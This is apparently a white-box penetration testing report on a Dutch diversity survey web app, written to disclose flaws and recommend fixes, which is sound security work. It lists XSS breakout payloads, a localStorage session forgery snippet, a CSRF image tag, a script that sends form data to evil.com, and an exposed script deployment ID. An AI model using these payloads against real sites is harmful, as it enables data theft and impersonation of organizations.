# Penetration Testing Report — Monitoring Cultureel Talent naar de Top

**Date:** 2026-02-02
**Scope:** Client-side application code, API integration, session management, transport security
**Method:** Static analysis / white-box review

---

## Executive Summary

The application has **6 critical**, **3 high**, and **4 medium** severity findings. The most impactful issues are: DOM-based XSS in the review page, complete lack of server-side authentication/authorization, all data transmitted via GET query parameters (visible in logs/history), and no CSRF protection. The client-side-only session model means any user can impersonate any organization by editing localStorage.

---

## Critical Findings

### 1. DOM-Based XSS — Unescaped User Input in Review Page

**Severity:** CRITICAL
**File:** `src/js/review.js:328,337,346,354`
**Type:** CWE-79 (Stored Cross-Site Scripting)

User-controlled form values are interpolated directly into HTML template literals without escaping:

```javascript
// Line 328 — textarea breakout
<textarea ...>${currentValue}</textarea>

// Lines 337, 346, 354 — attribute breakout
<input ... value="${currentValue}" ...>
```

**Attack vector:** Enter `</textarea><img src=x onerror="alert(document.cookie)"><textarea>` in any textarea field, then navigate to the review page (step 14). The payload executes in the DOM.

For input fields: `" onfocus="alert(1)" autofocus="` breaks out of the value attribute.

**Impact:** Arbitrary JavaScript execution. Since data persists in localStorage, this is effectively stored XSS — it fires every time the review page is visited.

**Note:** The codebase has a correct `escapeHtml()` function in `src/js/utils.js:9-13` that is imported but not used in review.js for these values.

---

### 2. No Server-Side Authentication or Authorization

**Severity:** CRITICAL
**Files:** `js/auth.js`, `js/storage.js:94-117`, `js/api.js:73-94`
**Type:** CWE-306 (Missing Authentication for Critical Function)

The entire auth model is client-side:

1. User enters org code → server returns org name → stored in localStorage
2. All subsequent API calls include the org code as a plain query parameter
3. No session token, JWT, or server-side session exists
4. The 24-hour timeout is enforced only via client-side `Date.now()` check

**Attack vector:**
```javascript
// In browser console:
localStorage.setItem('cttt_session', JSON.stringify({
  orgCode: 'TARGET-ORG',
  orgName: 'Any Name',
  timestamp: Date.now()
}));
location.reload();
```

This grants full access to submit data as any organization.

---

### 3. IDOR — No Organization Isolation

**Severity:** CRITICAL
**File:** `src/js/form.js:94-104`
**Type:** CWE-639 (Authorization Bypass Through User-Controlled Key)

Form submission reads `orgCode` from the client-side session object:

```javascript
data.orgCode = state.session.orgCode;
data.orgName = state.session.orgName;
```

Since the session is stored in localStorage with no server validation, an attacker can submit survey responses for any organization by changing the `orgCode` value.

**Impact:** Data integrity compromise across all participating organizations.

---

### 4. All Data Sent via GET Query Parameters

**Severity:** CRITICAL
**File:** `js/api.js:79-85`
**Type:** CWE-598 (Use of GET Request Method With Sensitive Query Strings)

Due to a GAS limitation (POST body lost during 302 redirect), all data — including organization names, employee counts, diversity metrics, and free-text responses — is sent as GET parameters:

```
GET /api/?action=saveResponses&code=ABC-XYZ&data={"organisatie":"...","aantal_werknemers":"500",...}
```

This data appears in:
- Browser history and address bar
- Server/proxy/CDN access logs
- Referrer headers when navigating away
- Network monitoring tools
- Browser cache

---

### 5. Hardcoded GAS Endpoint URL in Source Code

**Severity:** CRITICAL
**Files:** `js/config.js:23`, `netlify.toml:13,19`
**Type:** CWE-798 (Use of Hard-coded Credentials)

The full Google Apps Script execution URL is committed to the repository:

```
AKfycbw3gcRqlbc9lH0WKiR5yEeM4whu_WFVAUg9lE8cf9Uyf6C-teYRfA5CQX2tCaZZiV-nlg
```

Anyone with this URL can directly call the GAS endpoint, bypassing the Netlify proxy entirely. The URL is also visible in browser DevTools, page source, and git history.

---

### 6. No CSRF Protection

**Severity:** CRITICAL
**Files:** `js/api.js:85`, `src/js/form.js`
**Type:** CWE-352 (Cross-Site Request Forgery)

All state-changing operations use GET requests with no CSRF tokens, no origin validation, and no SameSite cookie protection (no cookies are used at all).

**Attack vector:** A malicious page can trigger a submission:
```html
<img src="https://script.google.com/macros/s/.../exec?action=saveResponses&code=ABC-XYZ&data={...}">
```

The victim's browser will make this request with no user interaction required.

---

## High Findings

### 7. No Rate Limiting on Code Validation

**Severity:** HIGH
**File:** `js/auth.js:187-283`
**Type:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

Organization codes follow a `XXX-XXX` pattern (alphanumeric). There is no client-side or (apparent) server-side rate limiting on the `checkCode` action. An attacker can brute-force valid organization codes.

With 36^6 = ~2.18 billion possible codes, a targeted attack on likely patterns (e.g., sequential codes, dictionary-based) could enumerate valid organizations.

---

### 8. Sensitive Data Logged to Console

**Severity:** HIGH
**File:** `js/api.js:235`
**Type:** CWE-532 (Information Exposure Through Log Files)

Full API URLs including all form data are logged to the browser console:

```javascript
console.log(`[API] ${label}: ${method} ${url}`);
```

On shared/public computers, this data persists in DevTools console history.

---

### 9. Demo Mode Allows Unauthenticated Submissions

**Severity:** HIGH
**File:** `js/auth.js:328-341`
**Type:** CWE-287 (Improper Authentication)

When the GAS URL is unset, demo mode accepts any `XXX-XXX` formatted code. If this mode were accidentally enabled in production (e.g., config error), any user could submit data for fabricated organizations, polluting the dataset.

---

## Medium Findings

### 10. Missing Content-Security-Policy Header

**Severity:** MEDIUM
**File:** `netlify.toml:31-37`
**Type:** CWE-1021 (Improper Restriction of Rendered UI Layers)

No CSP header is configured. This means:
- Inline scripts execute without restriction
- External scripts can be loaded from any origin
- XSS payloads have no restrictions on what they can do

Present headers: `X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`, `Referrer-Policy`

Missing: `Content-Security-Policy`, `Strict-Transport-Security`, `Permissions-Policy`

---

### 11. No Input Length Validation on Text Fields

**Severity:** MEDIUM
**File:** `src/data/survey-data.js`
**Type:** CWE-20 (Improper Input Validation)

Most text inputs and textareas have no `maxlength` attribute. Only `voorbeeld_organisatie` has a word limit (enforced client-side via JS). An attacker could submit arbitrarily large payloads.

---

### 12. Contenteditable Word Counter — Unescaped HTML

**Severity:** MEDIUM
**File:** `src/js/utils.js:120-129`
**Type:** CWE-79 (Cross-Site Scripting)

Words from the contenteditable div are rendered back via `innerHTML` without escaping:

```javascript
return `<span style="color: ${color}; font-weight: 600;">${word}</span>`;
// ...
editor.innerHTML = html;
```

If a user types HTML tags as words, they will be interpreted as HTML.

---

### 13. Client-Side-Only Conditional Field Validation

**Severity:** MEDIUM
**File:** `js/constants.js:36-63`
**Type:** CWE-602 (Client-Side Enforcement of Server-Side Security)

Business logic for conditional fields (e.g., "if streefcijfer=Ja, then percentage is required") is enforced only in the browser. An attacker can submit incomplete or inconsistent data by crafting direct API requests.

---

## Informational Findings

| Finding | File | Note |
|---------|------|------|
| No cookies used | Design decision | Privacy-friendly but means no SameSite CSRF protection |
| `X-XSS-Protection` header | netlify.toml:35 | Deprecated; modern browsers ignore it. CSP is the replacement |
| `Cache-Control: no-cache` | netlify.toml:43-48 | Good — prevents caching of JS/CSS with sensitive logic |
| `Object.freeze` on config | js/config.js | Good — prevents runtime config tampering via console |
| No `eval()` or `new Function()` | All files | Good — no dynamic code execution |
| Public preview at `/inkijkexemplaar` | js/auth.js, app.js | By design, but submissions from this path should be rejected server-side |

---

## Recommended Remediations (Priority Order)

1. **Escape all user data in review.js** — Apply `escapeHtml()` to all `currentValue` interpolations (lines 328, 337, 346, 354). Minimal code change, highest impact.

2. **Add server-side authorization** — The GAS backend should validate that the requesting session/code is authorized for the target organization on every `saveResponses` call.

3. **Implement CSRF tokens** — Generate a token server-side on `checkCode`, require it on `saveResponses`.

4. **Add Content-Security-Policy header** — At minimum: `default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://fonts.googleapis.com; font-src https://fonts.gstatic.com`

5. **Add Strict-Transport-Security header** — `max-age=31536000; includeSubDomains`

6. **Rate limit code validation** — Implement server-side rate limiting on the `checkCode` endpoint (e.g., 5 attempts per IP per minute).

7. **Rotate the GAS deployment URL** — The current URL is permanently in git history. Deploy a new GAS version and use Netlify environment variables instead of hardcoding.

8. **Add `maxlength` to all text inputs and textareas** — Server-side length validation as well.

9. **Sanitize console logging** — Remove or redact sensitive data from `console.log` calls in api.js.

10. **Validate conditional field logic server-side** — Ensure required dependent fields are present when parent conditions are met.

---

## Attack Scenarios

### Scenario A: Organization Impersonation
1. Attacker visits the public site, opens DevTools
2. Observes a valid org code from network tab (or brute-forces one)
3. Sets `cttt_session.orgCode` to target organization in localStorage
4. Fills out the survey with false data and submits
5. Target organization's real data is overwritten

### Scenario B: Stored XSS via Review Page
1. Attacker accesses survey (via `/inkijkexemplaar` or a valid code)
2. Enters `</textarea><script>fetch('https://evil.com/?d='+localStorage.getItem('cttt_form_data'))</script>` in a textarea
3. Navigates to review page — script executes, exfiltrating all form data
4. If this data is loaded by another user (e.g., admin review), the XSS propagates

### Scenario C: Direct API Abuse
1. Attacker extracts GAS URL from page source
2. Calls `?action=saveResponses&code=XXX-YYY&data={...}` directly with curl
3. Submits fabricated survey responses for any organization
4. No authentication or rate limiting prevents this
